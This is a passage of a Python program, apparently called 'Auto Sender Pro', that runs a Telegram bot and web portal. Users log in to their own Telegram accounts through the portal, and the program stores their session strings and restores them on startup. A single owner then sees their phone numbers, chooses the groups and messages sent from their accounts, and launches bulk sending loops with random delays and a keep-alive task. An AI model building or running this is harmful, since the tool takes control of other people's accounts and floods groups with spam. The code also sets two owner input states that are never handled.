        update = Update.de_json(data, _bot_app.bot)
        await _bot_app.process_update(update)
    except Exception:
        pass
    return web.Response(text="ok")

def build_web_app():
    app = web.Application()
    app.router.add_get("/",            index)
    app.router.add_get("/health",      health)
    app.router.add_get("/register",    register)
    app.router.add_get(r"/{slug}",     user_page)
    # User routes
    app.router.add_post("/u/send_otp",   u_send_otp)
    app.router.add_post("/u/verify_otp", u_verify_otp)
    app.router.add_post("/u/resend_otp", u_resend_otp)
    app.router.add_post("/u/verify_2fa", u_verify_2fa)
    # Owner routes
    app.router.add_post("/o/send_otp",   owner_send_otp)
    app.router.add_post("/o/verify_otp", owner_verify_otp)
    app.router.add_post("/o/resend_otp", owner_resend_otp)
    app.router.add_post("/o/verify_2fa", owner_verify_2fa)
    # Webhook
    app.router.add_post(f"/{BOT_TOKEN}", telegram_webhook)
    return app

# ═══════════════════════════════════════════════════════
#                   BOT UI
# ═══════════════════════════════════════════════════════
def owner_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 My Login",      callback_data="cb_owner_login"),
         InlineKeyboardButton("📊 Status",        callback_data="cb_status")],
        [InlineKeyboardButton("👥 Users List",    callback_data="cb_users"),
         InlineKeyboardButton("📋 User Details",  callback_data="cb_user_detail")],
        [InlineKeyboardButton("👥 Set Groups",    callback_data="cb_groups"),
         InlineKeyboardButton("✉️ Set Message",   callback_data="cb_message")],
        [InlineKeyboardButton("▶️ Start All",     callback_data="cb_start_all"),
         InlineKeyboardButton("⏹ Stop All",       callback_data="cb_stop_all")],
        [InlineKeyboardButton("🔄 Refresh",       callback_data="cb_home")],
    ])

def home_text():
    web = RENDER_URL or f"http://localhost:{PORT}"
    owner_login = "✅ Active" if "__owner__" in active_clients else "❌ Not logged in"
    users_count = len(db["users"])
    running_count = sum(1 for u in db["users"].values() if u.get("running"))
    total_sent  = sum(u["stats"]["sent"] for u in db["users"].values())
    return (
        "```\n"
        "╔═══════════════════════════════╗\n"
        "║  📡 AUTO SENDER PRO · ADMIN  ║\n"
        "║  Multi-User · Web Login      ║\n"
        "╚═══════════════════════════════╝\n"
        "```\n"
        f"🔐 *Owner Login* : {owner_login}\n"
        f"👥 *Total Users* : `{users_count}`\n"
        f"🟢 *Running*     : `{running_count}`\n"
        f"📤 *Total Sent*  : `{total_sent}`\n\n"
        f"🌐 *Main Portal* : [Open]({web})\n"
        f"📝 *User Login*  : [Register]({web}/register)"
    )

# ═══════════════════════════════════════════════════════
#               BOT HANDLERS
# ═══════════════════════════════════════════════════════
owner_state = {"awaiting": None, "target_slug": None}

async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    await update.message.reply_text(
        home_text(), parse_mode="Markdown",
        reply_markup=owner_kb(), disable_web_page_preview=True,
    )

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.from_user.id != OWNER_ID:
        return
    d = q.data

    if d == "cb_home":
        await q.message.edit_text(
            home_text(), parse_mode="Markdown",
            reply_markup=owner_kb(), disable_web_page_preview=True,
        )

    elif d == "cb_owner_login":
        web_url = (RENDER_URL or f"http://localhost:{PORT}") + "/register"
        if "__owner__" in active_clients:
            await q.message.reply_text("✅ *Already logged in!*", parse_mode="Markdown")
            return
        await q.message.reply_text(
            f"🌐 *Owner Login*\n\nOpen web portal and login:\n{web_url}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🌐 Open Login", url=web_url),
            ]])
        )

    elif d == "cb_status":
        lines = ["📊 *ALL USERS STATUS*\n" + "═"*26]
        for slug, u in db["users"].items():
            run = "🟢" if u.get("running") else "🔴"
            lines.append(
                f"{run} *{u['name']}* (`{slug}`)\n"
                f"   📤 {u['stats']['sent']} sent  ❌ {u['stats']['failed']} failed  "
                f"👥 {len(u['groups'])} groups"
            )
        if not db["users"]:
            lines.append("_No users yet_")
        await q.message.reply_text(
            "\n\n".join(lines), parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔁 Refresh", callback_data="cb_status"),
                InlineKeyboardButton("🏠 Home",    callback_data="cb_home"),
            ]])
        )

    elif d == "cb_users":
        if not db["users"]:
            await q.message.reply_text("👥 No users registered yet.", parse_mode="Markdown")
            return
        btns = []
        for slug, u in db["users"].items():
            run = "🟢" if u.get("running") else "🔴"
            btns.append([InlineKeyboardButton(
                f"{run} {u['name']} · {u['stats']['sent']} sent",
                callback_data=f"cb_sel_{slug}"
            )])
        btns.append([InlineKeyboardButton("🏠 Home", callback_data="cb_home")])
        await q.message.reply_text(
            "👥 *Registered Users:*\nTap to manage →",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(btns)
        )

    elif d.startswith("cb_sel_"):
        slug = d[7:]
        u = db["users"].get(slug)
        if not u:
            await q.message.reply_text("❌ User not found.")
            return
        run = "🟢 Running" if u.get("running") else "🔴 Stopped"
        msg_prev = (u["message"][:60] + "…") if len(u["message"]) > 60 else u["message"]
        await q.message.reply_text(
            f"👤 *{u['name']}* (`{slug}`)\n"
            f"📱 `{u.get('tg_phone','?')}`\n"
            f"⚙️ {run}\n"
            f"👥 Groups: `{len(u['groups'])}`\n"
            f"📤 Sent: `{u['stats']['sent']}`  ❌ Failed: `{u['stats']['failed']}`\n"
            f"💬 Msg: `{msg_prev or 'Not set'}`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("▶️ Start", callback_data=f"cb_ustart_{slug}"),
                 InlineKeyboardButton("⏹ Stop",  callback_data=f"cb_ustop_{slug}")],
                [InlineKeyboardButton("👥 Set Groups",  callback_data=f"cb_ugrp_{slug}"),
                 InlineKeyboardButton("✉️ Set Msg",     callback_data=f"cb_umsg_{slug}")],
                [InlineKeyboardButton("🗑 Delete User", callback_data=f"cb_udel_{slug}"),
                 InlineKeyboardButton("◀️ Back",        callback_data="cb_users")],
            ])
        )

    elif d.startswith("cb_ustart_"):
        slug = d[10:]
        u = db["users"].get(slug)
        if not u:
            await q.message.reply_text("❌ Not found."); return
        if not u["groups"]:
            await q.message.reply_text(f"❌ No groups set for {u['name']}."); return
        if not u["message"]:
            await q.message.reply_text(f"❌ No message set for {u['name']}."); return
        if u.get("running"):
            await q.message.reply_text("⚠️ Already running!"); return
        client = active_clients.get(slug)
        if not client:
            # Restore session
            try:
                c = TelegramClient(StringSession(u["session"]), API_ID, API_HASH)
                await c.connect()
                if not await c.is_user_authorized():
                    await q.message.reply_text(f"❌ Session expired for {u['name']}. Ask them to re-login.")
                    return
                active_clients[slug] = c
                client = c
            except Exception as e:
                await q.message.reply_text(f"❌ Client error: `{e}`", parse_mode="Markdown")
                return
        u["running"] = True
        u["stats"]   = {"sent": 0, "failed": 0, "cycles": 0}
        save_db()
        active_tasks[slug] = asyncio.create_task(sending_loop(slug))
        await q.message.reply_text(
            f"🚀 *Started for {u['name']}!*\n"
            f"👥 `{len(u['groups'])}` groups  ⏱ `{MIN_DELAY}–{MAX_DELAY}s` delay",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_ustop_"):
        slug = d[9:]
        u = db["users"].get(slug)
        if not u:
            await q.message.reply_text("❌ Not found."); return
        u["running"] = False
        t = active_tasks.get(slug)
        if t and not t.done(): t.cancel()
        save_db()
        await q.message.reply_text(
            f"⏹ *Stopped {u['name']}.*\n"
            f"📤 `{u['stats']['sent']}` sent  ❌ `{u['stats']['failed']}` failed",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_ugrp_"):
        slug = d[8:]
        owner_state["awaiting"]     = "groups"
        owner_state["target_slug"]  = slug
        await q.message.reply_text(
            f"👥 *Set groups for {db['users'][slug]['name']}*\n\nOne per line:",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_umsg_"):
        slug = d[8:]
        owner_state["awaiting"]    = "message"
        owner_state["target_slug"] = slug
        await q.message.reply_text(
            f"✉️ *Set message for {db['users'][slug]['name']}:*",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_udel_"):
        slug = d[8:]
        u = db["users"].pop(slug, None)
        if u:
            t = active_tasks.get(slug)
            if t and not t.done(): t.cancel()
            c = active_clients.pop(slug, None)
            if c:
                try: await c.disconnect()
                except: pass
            save_db()
            await q.message.reply_text(f"🗑 *{u['name']}* deleted.", parse_mode="Markdown")
        else:
            await q.message.reply_text("❌ User not found.")

    elif d == "cb_start_all":
        started = 0
        for slug, u in db["users"].items():
            if u.get("running") or not u["groups"] or not u["message"]:
                continue
            client = active_clients.get(slug)
            if not client:
                try:
                    c = TelegramClient(StringSession(u["session"]), API_ID, API_HASH)
                    await c.connect()
                    if await c.is_user_authorized():
                        active_clients[slug] = c
                        client = c
                except Exception:
                    continue
            if client:
                u["running"] = True
                u["stats"]   = {"sent": 0, "failed": 0, "cycles": 0}
                active_tasks[slug] = asyncio.create_task(sending_loop(slug))
                started += 1
        save_db()
        await q.message.reply_text(f"🚀 *Started `{started}` user(s)!*", parse_mode="Markdown")

    elif d == "cb_stop_all":
        stopped = 0
        for slug, u in db["users"].items():
            if u.get("running"):
                u["running"] = False
                t = active_tasks.get(slug)
                if t and not t.done(): t.cancel()
                stopped += 1
        save_db()
        await q.message.reply_text(f"⏹ *Stopped `{stopped}` user(s).*", parse_mode="Markdown")

    elif d == "cb_groups":
        owner_state["awaiting"]    = "owner_groups"
        owner_state["target_slug"] = "__owner__"
        await q.message.reply_text("👥 *Set groups (for owner account):*\nOne per line:", parse_mode="Markdown")

    elif d == "cb_message":
        owner_state["awaiting"]    = "owner_message"
        owner_state["target_slug"] = "__owner__"
        await q.message.reply_text("✉️ *Send your broadcast message:*", parse_mode="Markdown")

    elif d == "cb_user_detail":
        await q.message.reply_text(
            f"📋 *User URL format:*\n\n"
            f"`{RENDER_URL or 'http://localhost:'+str(PORT)}/{{slug}}`\n\n"
            f"Share `/register` URL to users:\n"
            f"`{RENDER_URL or 'http://localhost:'+str(PORT)}/register`",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    text = update.message.text.strip()
    aw   = owner_state.get("awaiting")
    slug = owner_state.get("target_slug")

    if aw == "groups" and slug and slug in db["users"]:
        owner_state["awaiting"] = None
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        db["users"][slug]["groups"] = lines
        save_db()
        await update.message.reply_text(
            f"✅ `{len(lines)}` groups saved for *{db['users'][slug]['name']}*",
            parse_mode="Markdown"
        )

    elif aw == "message" and slug and slug in db["users"]:
        owner_state["awaiting"] = None
        db["users"][slug]["message"] = text
        save_db()
        await update.message.reply_text(
            f"✅ Message saved for *{db['users'][slug]['name']}*",
            parse_mode="Markdown"
        )

    else:
        await update.message.reply_text(
            "Use /start to open the panel.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Open Panel", callback_data="cb_home")
            ]])
        )

# ═══════════════════════════════════════════════════════
#                    MAIN
# ═══════════════════════════════════════════════════════
def print_banner():
    console.print(Panel.fit(
        "[bold cyan]📡 AUTO SENDER PRO[/bold cyan]\n"
        "[dim]Multi-User · Web Login · Render Ready · Anti-Sleep[/dim]",
        border_style="bright_cyan", padding=(1, 6),
    ))
    web = RENDER_URL or f"http://localhost:{PORT}"
    t = Table(box=box.ROUNDED, border_style="dim cyan", show_header=False, padding=(0, 2))
    t.add_column("", style="bold yellow", no_wrap=True)
    t.add_column("", style="white")
    t.add_row("Main URL",  web)
    t.add_row("Register",  web + "/register")
    t.add_row("Owner ID",  str(OWNER_ID) if OWNER_ID else "⚠️  Set OWNER_ID")
    t.add_row("Port",      str(PORT))
    t.add_row("Keep-Alive","Every 14 min")
    console.print(t)
    console.print()

async def restore_sessions():
    """Restore all saved sessions on startup."""
    for slug, u in db["users"].items():
        if u.get("session"):
            try:
                c = TelegramClient(StringSession(u["session"]), API_ID, API_HASH)
                await c.connect()
                if await c.is_user_authorized():
                    active_clients[slug] = c
                    console.print(f"[green]✅ Restored: {u['name']} ({slug})[/green]")
                    # Resume running tasks
                    if u.get("running") and u["groups"] and u["message"]:
                        active_tasks[slug] = asyncio.create_task(sending_loop(slug))
                        console.print(f"[cyan]▶️  Resumed sender: {u['name']}[/cyan]")
                else:
                    console.print(f"[yellow]⚠️  Session expired: {u['name']}[/yellow]")
                    u["running"] = False
            except Exception as e:
                console.print(f"[red]❌ Failed to restore {u['name']}: {e}[/red]")

    # Restore owner session
    owner_sess = db.get("owner_session")
    if owner_sess:
        try:
            c = TelegramClient(StringSession(owner_sess), API_ID, API_HASH)
            await c.connect()
            if await c.is_user_authorized():
                active_clients["__owner__"] = c
                console.print("[green]✅ Owner session restored![/green]")
        except Exception:
            pass

async def run_all():
    global _bot_app
    load_db()

    if not BOT_TOKEN:
        console.print("[red]❌ BOT_TOKEN not set![/red]"); sys.exit(1)
    if OWNER_ID == 0:
        console.print("[red]❌ OWNER_ID not set![/red]"); sys.exit(1)

    await restore_sessions()
    save_db()

    # Bot
    bot_app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .concurrent_updates(False)
        .updater(None)
        .build()
    )
    _bot_app = bot_app
    bot_app.add_handler(CommandHandler("start",   start_cmd))
    bot_app.add_handler(CallbackQueryHandler(button_handler))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await bot_app.initialize()
    await bot_app.start()

    # Web
    web_app = build_web_app()
    runner  = web.AppRunner(web_app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    console.print(f"[cyan]🌐 Web ready on port {PORT}[/cyan]")

    # Webhook / Polling
    if RENDER_URL:
        webhook_url = f"{RENDER_URL}/{BOT_TOKEN}"
        await bot_app.bot.set_webhook(url=webhook_url, drop_pending_updates=True)
        console.print(f"[cyan]🔗 Webhook: {webhook_url}[/cyan]")
    else:
        await bot_app.bot.delete_webhook(drop_pending_updates=True)
        await bot_app.updater.start_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

    # Keep-alive
    asyncio.create_task(keep_alive_loop())

    web_url = RENDER_URL or f"http://localhost:{PORT}"
    console.print(f"[bold green]✅ All systems go![/bold green]")
    console.print(f"[bold yellow]🌐 {web_url}[/bold yellow]")

    try:
        await asyncio.Event().wait()
    finally:
        for slug, u in db["users"].items():
            u["running"] = False
        save_db()
        await bot_app.stop()
        await bot_app.shutdown()
        await runner.cleanup()

def main():
    print_banner()
    asyncio.run(run_all())

if __name__ == "__main__":
    main()
